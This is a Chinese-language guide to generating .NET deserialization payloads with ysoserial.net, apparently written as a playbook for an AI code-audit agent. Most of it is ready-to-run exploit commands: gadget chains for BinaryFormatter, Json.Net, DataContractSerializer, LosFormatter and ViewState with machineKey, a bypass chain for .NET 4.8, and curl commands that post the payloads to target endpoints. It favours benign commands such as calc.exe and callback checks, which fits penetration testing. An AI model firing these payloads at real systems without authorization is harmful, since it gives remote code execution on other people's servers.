# ysoserial.net — .NET 反序列化 Payload 生成指南

> 适用场景：dotnet-audit Layer 3 调用链验证阶段，确认反序列化漏洞成立条件后，生成可用 PoC payload。

---

## 工具获取与环境要求

```bash
# 推荐：直接使用预编译版本
git clone https://github.com/pwntester/ysoserial.net
# 或下载 Release binary（需 .NET Framework 4.6.1+）

# 验证可用
ysoserial.exe -h
```

---

## 核心命令结构

```
ysoserial.exe -f <格式化器> -g <Gadget链> -c <命令> [选项]
```

| 参数 | 说明 | 示例值 |
|------|------|--------|
| `-f` | 格式化器（序列化协议）| `BinaryFormatter` / `Json.Net` / `DataContractSerializer` |
| `-g` | Gadget 链名称 | `ObjectDataProvider` / `WindowsIdentity` / `ActivitySurrogateSelector` |
| `-c` | 要执行的系统命令 | `"calc"` / `"whoami > C:\\output.txt"` |
| `-o` | 输出格式 | `raw` / `base64` / `hex` |
| `-t` | 测试本地是否可触发 | 加 `-t` flag |

---

## 常用 Gadget 链 × 格式化器矩阵

### BinaryFormatter（.NET Framework 全版本高危）

```bash
# ObjectDataProvider → Process.Start（最通用 RCE 链）
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "calc.exe" -o base64

# ActivitySurrogateSelector（.NET 4.x 专属，4.6+ 已修复但旧环境常见）
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "calc.exe" -o base64

# ActivitySurrogateDisableTypeCheck（.NET 4.8+ 绕过链）
# 背景: 微软在 .NET 4.8 封堵了 ActivitySurrogateSelector，但此链通过先禁用类型检查再触发实现绕过
# 使用方式: 需两步执行——先发送 DisableTypeCheck payload，再发送 ActivitySurrogateSelector payload
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateDisableTypeCheck -c "calc.exe" -o base64
# 注意: 需目标启用 AppContext "Switch.System.Activities.DoNotDisableActivitySurrogateSelector" = false

# WindowsIdentity → 令牌操作（权限提升场景）
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "whoami" -o base64

# TypeConfuseDelegate（通用，跨版本）
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami > C:\\t.txt" -o base64
```

**链选择决策树（BinaryFormatter）**:
```
目标 .NET 版本?
├─ < 4.8 → 优先 ActivitySurrogateSelector / ObjectDataProvider
├─ 4.8+ → 优先 ActivitySurrogateDisableTypeCheck（两步）/ TypeConfuseDelegate
└─ 任意版本 → ObjectDataProvider 通用兜底
```

### Json.Net（TypeNameHandling.All / TypeNameHandling.Auto + $type 输入）

```bash
# ObjectDataProvider 链
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe" -o raw

# 输出为 JSON payload，注入到目标的 $type 字段
# 示例输出:
# {"$type":"System.Windows.Data.ObjectDataProvider, ...","MethodName":"Start",...}
```

### DataContractSerializer

```bash
ysoserial.exe -f DataContractSerializer -g ObjectDataProvider -c "calc.exe" -o raw
```

### NetDataContractSerializer（直接 Confirmed，无条件）

```bash
ysoserial.exe -f NetDataContractSerializer -g ObjectDataProvider -c "calc.exe" -o base64
```

### LosFormatter（ASP.NET WebForms ViewState / __EVENTVALIDATION 场景）

```bash
ysoserial.exe -f LosFormatter -g ObjectDataProvider -c "calc.exe" -o base64
# 将 base64 输出替换 POST 请求中的 __VIEWSTATE 字段
```

### ViewState / MachineKey（专用，见 viewstate_machinekey.md）

```bash
# 需要已知 machineKey 和 validationKey
ysoserial.exe -p ViewState -g ObjectDataProvider -c "calc.exe" \
  --validationalg="SHA1" \
  --validationkey="<实际validationKey>" \
  --generator="<generator值（__VIEWSTATE_GENERATOR）>" \
  --path="/default.aspx" \
  --islegacy
```

---

## 输出格式选择指南

| 场景 | 推荐格式 | 参数 |
|------|---------|------|
| HTTP POST Body（BinaryFormatter 直接接收字节流）| 16进制或原始字节 | `-o hex` |
| JSON body 字段注入 | 原始 JSON | `-o raw` |
| Base64编码字段（如 ViewState / Cookie）| Base64 | `-o base64` |
| 本地验证是否 RCE | 测试模式 | `-t` |

---

## 版本-Gadget 可用性速查

| Gadget 链 | .NET 4.0 | .NET 4.6 | .NET 4.8 | .NET 5+ |
|-----------|---------|---------|---------|---------|
| ObjectDataProvider | ✅ | ✅ | ✅ | ⚠️ BinaryFormatter 默认抛异常 |
| ActivitySurrogateSelector | ✅ | ✅ | ❌ 已修复 | ❌ |
| WindowsIdentity | ✅ | ✅ | ✅ | ⚠️ |
| TypeConfuseDelegate | ✅ | ✅ | ✅ | ⚠️ |
| TextFormattingRunProperties | WPF场景 | WPF场景 | WPF场景 | ❌ |

> .NET 5+：`BinaryFormatter` 默认抛 `NotSupportedException`，除非应用显式设置
> `AppContext.SetSwitch("Switch.System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization", true)`
> 若发现此开关被显式启用，则漏洞仍然 Confirmed。

---

## PoC 注入方式

### HTTP POST Body（BinaryFormatter 直接接受字节流）

```bash
# 生成 hex payload
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "whoami" -o hex

# curl 注入（Content-Type: application/octet-stream）
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/octet-stream" \
  --data-binary @<(echo -n "<hex_payload>" | xxd -r -p)
```

### JSON 字段注入（Json.Net TypeNameHandling）

```bash
# 目标接口接受 JSON，含 $type 字段
curl -X POST https://target.com/api/process \
  -H "Content-Type: application/json" \
  -d '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework...","MethodName":"Start",...}'
```

### ViewState 字段（见 viewstate_machinekey.md 详细步骤）

---

## 反幻觉注意事项

- **禁止只因发现 `BinaryFormatter` 就生成 payload 并标注 Confirmed**：必须先通过 dotnet-audit 成立条件判断表确认用户输入可达该调用点。
- **gadget-hunter subagent 枚举完成后再选链**：不要默认 ObjectDataProvider，先确认目标 classpath/GAC 中存在所需程序集。
- **.NET 5+ 下 BinaryFormatter 的 enableUnsafeBinary 开关**：每次都要用 `grep -r "EnableUnsafeBinaryFormatterSerialization"` 检查，不能假设未启用。
- **PoC 命令用 `calc.exe` 或 OOB 回调**：不使用破坏性命令（`rm`/`del`/`shutdown`），Collaborator DNS 回调是优先选择。
